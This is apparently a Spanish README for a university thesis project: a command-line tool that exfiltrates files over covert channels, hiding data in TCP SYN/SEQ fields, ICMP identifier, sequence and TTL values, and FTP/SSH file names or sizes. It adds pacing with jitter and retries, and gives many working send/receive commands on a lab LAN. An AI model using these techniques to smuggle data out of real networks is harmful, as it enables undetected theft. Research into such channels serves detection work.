# TFG – Proyecto CLI (Integración M5: Robustez LAN)

Novedades M5:
- **Token de autenticación** opcional (`X-Auth-Token`) en receptor/cliente.
- **Reintentos con backoff exponencial** en envíos.
- **Control de ritmo** (espera base + dispersión) en el cliente.
- **Sondeo de estado** por `HEAD` para conocer `X-Exfil-Next-Seq` (reanudación básica, evita duplicados).

## Flags nuevos
- `--auth-token` (send/receive): token compartido para autenticar contra el receptor.
- `--retries`, `--retry-backoff-ms` (send)
- `--ritmo-base-ms`, `--ritmo-dispersion-ms` (send)
- `--resume-probe` (send): pregunta al receptor el siguiente `seq` esperado y omite los fragmentos iniciales ya recibidos.

## Ejemplo LAN (verbs + AESGCM + auth + ritmo)
Servidor (receptor):
```
py -3 tfg_cli.py receive ^
  --transfer-id RX1 ^
  --canal HTTP --metodo 2 ^
  --host 0.0.0.0 --puerto 8080 --ruta /upload ^
  --auth-token SECRET123 ^
  --cifrado SIMETRICO --algoritmo AESGCM ^
  --clave-privada C:\key.bin ^
  --crypto-meta-in C:\meta_aes.json ^
  --plugins-dir plugins ^
  --out-file C:\salida.bin
```
Cliente (emisor):
```
py -3 tfg_cli.py send ^
  --transfer-id RX1 ^
  --canal HTTP --metodo 2 ^
  --host 192.168.1.50 --puerto 8080 --ruta /upload ^
  --auth-token SECRET123 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --fragment-size 16384 ^
  --retries 5 --retry-backoff-ms 200 ^
  --ritmo-base-ms 50 --ritmo-dispersion-ms 25 ^
  --cifrado SIMETRICO --algoritmo AESGCM ^
  --clave-privada C:\key.bin ^
  --crypto-meta-out C:\meta_aes.json ^
  --resume-probe ^
  --plugins-dir plugins
```

## Notas
- Si `--resume-probe` está activo, el cliente omite los primeros `seq` ya confirmados por el receptor (útil tras fallos transitorios dentro de la misma sesión o reintentos).
- El servidor ignora **duplicados** por `seq` recibido.
- En escenarios multi-proceso con cifrado, para reanudar se debe **reutilizar la misma meta** (nonce/prefix en AESGCM o clave de sesión en RSA) guardada en `--crypto-meta-out` (descifrado: `--crypto-meta-in`).

Para más detalles de uso en LAN, revisar la sección del README anterior.


## TCP (M6): método 3 (LENGTH) operativo; métodos 1/2 requieren raw sockets

Servidor (receptor, LENGTH):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXTCP ^
  --canal TCP --metodo 3 ^
  --host 0.0.0.0 --puerto 9000 ^
  --auth-token SECRET123 ^
  --cifrado NINGUNO ^
  --plugins-dir plugins ^
  --out-file C:\salida_tcp.bin
```
Cliente (emisor, LENGTH):
```
py -3 tfg_cli.py send ^
  --transfer-id RXTCP ^
  --canal TCP --metodo 3 ^
  --host 192.168.1.50 --puerto 9000 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --cifrado NINGUNO ^
  --plugins-dir plugins
```
Notas:
- La sesión incluye *preamble* con `TFG/1`, `ID`, `AUTH` y `MODE LENGTH`.
- Cada fragmento viaja como `[u32 longitud][payload]`. El receptor ensambla en orden de llegada.
- Métodos 1 (SYN-ACK) y 2 (SEQ) requieren **scapy** y permisos de **raw sockets**; quedan por implementar como plugins alternativos.


### Dependencias para TCP RAW (SYN-ACK y SEQ)
- `scapy` (envío/captura de paquetes raw).
- **Linux**: ejecutar como root o con `CAP_NET_RAW`.
- **Windows**: instalar **Npcap** y ejecutar PowerShell como Administrador.
- Parámetro opcional `--iface` para seleccionar interfaz.

#### Ejemplos RAW
Servidor (SYN-ACK: escucha símbolos en SYN → reconstruye y guarda):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXTCP1 ^
  --canal TCP --metodo 1 ^
  --host 0.0.0.0 --puerto 9001 ^
  --auth-token SECRET123 ^
  --plugins-dir plugins ^
  --out-file C:\salida_synack.bin
```
Cliente (SYN-ACK):
```
py -3 tfg_cli.py send ^
  --transfer-id RXTCP1 ^
  --canal TCP --metodo 1 ^
  --host 192.168.1.50 --puerto 9001 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --plugins-dir plugins ^
  --auth-token SECRET123
```
Servidor (SEQ: escucha símbolos en SEQ de ACKs):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXTCP2 ^
  --canal TCP --metodo 2 ^
  --host 0.0.0.0 --puerto 9002 ^
  --plugins-dir plugins ^
  --out-file C:\salida_seq.bin
```
Cliente (SEQ):
```
py -3 tfg_cli.py send ^
  --transfer-id RXTCP2 ^
  --canal TCP --metodo 2 ^
  --host 192.168.1.50 --puerto 9002 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --plugins-dir plugins
```


## ICMP (M7): métodos 1=Identifier, 2=Sequence, 3=TTL (RAW con scapy)

Requisitos RAW:
- `scapy` (ya declarado) y privilegios de captura/forja de paquetes.
- **Linux**: root o `CAP_NET_RAW`.
- **Windows**: **Npcap** y consola como Administrador.
- `--iface` para seleccionar interfaz si es necesario.
- Para método TTL, usar `--ttl-base` igual que en cliente para decodificación correcta (por defecto 64).

Servidor (Identifier):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXICMP1 ^
  --canal ICMP --metodo 1 ^
  --host 192.168.1.100 ^
  --plugins-dir plugins ^
  --out-file C:\salida_icmp_id.bin
```
Cliente (Identifier):
```
py -3 tfg_cli.py send ^
  --transfer-id RXICMP1 ^
  --canal ICMP --metodo 1 ^
  --host 192.168.1.100 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --plugins-dir plugins
```

Servidor (Sequence):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXICMP2 ^
  --canal ICMP --metodo 2 ^
  --host 192.168.1.100 ^
  --plugins-dir plugins ^
  --out-file C:\salida_icmp_seq.bin
```
Cliente (Sequence):
```
py -3 tfg_cli.py send ^
  --transfer-id RXICMP2 ^
  --canal ICMP --metodo 2 ^
  --host 192.168.1.100 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --plugins-dir plugins
```

Servidor (TTL):
```
py -3 tfg_cli.py receive ^
  --transfer-id RXICMP3 ^
  --canal ICMP --metodo 3 ^
  --host 192.168.1.100 ^
  --ttl-base 64 ^
  --plugins-dir plugins ^
  --out-file C:\salida_icmp_ttl.bin
```
Cliente (TTL):
```
py -3 tfg_cli.py send ^
  --transfer-id RXICMP3 ^
  --canal ICMP --metodo 3 ^
  --host 192.168.1.100 ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
  --ttl-base 64 ^
  --plugins-dir plugins
```


## FTP/SSH – nuevos métodos
- **Método 2 (nombre de fichero):** los bytes se codifican en Base32 dentro del nombre del fichero.
  - Cliente crea ficheros vacíos `EXFILID.<seq>.<token>`.
  - Servidor lista, ordena por `<seq>` y decodifica `<token>`.
- **Método 3 (tamaño de fichero):** cada fichero representa 1 byte mediante su tamaño `BASE+valor` (BASE=4096).
  - Cliente crea `EXFILID.sz.<seq>` con tamaño `4096+byte`.
  - Servidor lista y reconstruye `byte = size-4096`.

### Ejemplo (FTP método 2 - nombres)
Cliente:
```
py -3 tfg_cli.py send --transfer-id RXFTP2 --canal FTP --metodo 2 --host 192.168.1.10 --user user --password pass --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --plugins-dir plugins
```
Servidor:
```
py -3 tfg_cli.py receive --transfer-id RXFTP2 --canal FTP --metodo 2 --host 192.168.1.10 --user user --password pass --plugins-dir plugins --out-file C:\salida_ftp2.bin
```

### Ejemplo (SSH método 3 - tamaños)
Cliente:
```
py -3 tfg_cli.py send --transfer-id RXSSH3 --canal SSH --metodo 3 --host 192.168.1.20 --user alice --password secret --remote-dir /tmp --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.bin --plugins-dir plugins
```
Servidor:
```
py -3 tfg_cli.py receive --transfer-id RXSSH3 --canal SSH --metodo 3 --host 192.168.1.20 --user alice --password secret --remote-dir /tmp --plugins-dir plugins --out-file C:\salida_ssh3.bin
```


## Cambios en FTP/SSH
- **Eliminados** los plugins de método 1 (archivos con contenido).
- **Disponibles** únicamente:
  - **Método 2 (nombre de fichero)**: `ftp_client_names`/`ftp_server_names`, `ssh_client_names`/`ssh_server_names`.
  - **Método 3 (tamaño de fichero)**: `ftp_client_size`/`ftp_server_size`, `ssh_client_size`/`ssh_server_size`.

